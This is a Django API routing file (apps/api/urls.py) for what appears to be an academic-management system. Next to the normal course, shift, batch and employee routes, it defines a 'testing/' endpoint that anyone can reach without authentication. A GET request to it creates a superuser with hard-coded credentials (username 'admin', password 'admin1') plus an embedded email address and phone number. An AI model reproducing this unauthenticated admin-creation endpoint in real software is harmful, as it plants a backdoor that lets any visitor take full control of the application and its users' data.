#apps/api/urls.py: central API URL/router
from django.urls import path, include

from django.contrib.auth import get_user_model
User = get_user_model()
from rest_framework.views import APIView
from rest_framework.response import Response
class SuperAdminCreateView(APIView):
    def get(self, request):
        User.objects.create_user(
            full_name="Admin1",
            email="admin11@gmail.com",
            username="admin",
            password="admin1",
            phone_number="+9779813455422",
            role="admin",
            is_superuser=True,
            is_staff=True
        )
        return Response("SuperAdmin Created successfully.")



urlpatterns = [
    path("auth/", include("apps.authx.api.urls")),
    path("courses/", include("apps.academics.courses.api.urls")),
    path("shifts/", include("apps.academics.shifts.api.urls")),
    path("batches/", include("apps.academics.batches.api.urls")),
    path("employees/", include("apps.academics.employees.api.urls")),
    path("testing/", SuperAdminCreateView.as_view()),

]
